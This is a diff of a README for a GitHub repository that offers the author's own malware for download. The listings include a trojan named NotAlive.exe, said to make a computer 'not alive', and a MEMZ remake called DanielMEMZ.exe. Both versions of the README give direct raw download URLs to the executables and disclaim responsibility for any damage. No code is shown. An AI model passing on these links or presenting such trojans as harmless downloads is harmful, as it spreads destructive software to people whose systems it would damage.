@@ -1,19 +1,19 @@
 # DanielTrojans
-Here You Can Download All Daniel's Malwares! (aka me) :D
+Here you can download some old malware i made.
 
-**NOTE: I AM NOT RESPONSABLE FOR ANY DAMAGES CAUSED ON YOUR COMPUTER/VM, TRY IT AT YOUR OWN RISK!**
+**WARNING: I AM NOT RESPONSABLE FOR ANY DAMAGES CAUSED ON YOUR SYSTEM, TRY IT AT YOUR OWN RISK!**
 
 -------------------------------------------------------------------------------------------
 
 ***NotAlive.exe***
-A Trojan That Makes Your Computer "Not Alive"
+I mean, it's self-explainatory the name.
 
 **V1:** [Download](https://github.com/DanielProfessional/DanielTrojans/raw/main/assets%20(do%20not%20touch)/trojans/NotAlive.exe/NotAlive.exe.exe)
 
 -------------------------------------------------------------------------------------------
 
 ***DanielMEMZ.exe***
-A Remake Of MEMZ.
+Just a very simple MEMZ remake.
 
 **V1:** [Download](https://github.com/DanielProfessional/DanielTrojans/raw/main/assets%20(do%20not%20touch)/trojans/DanielMEMZ/DanielMEMZ.exe)
 
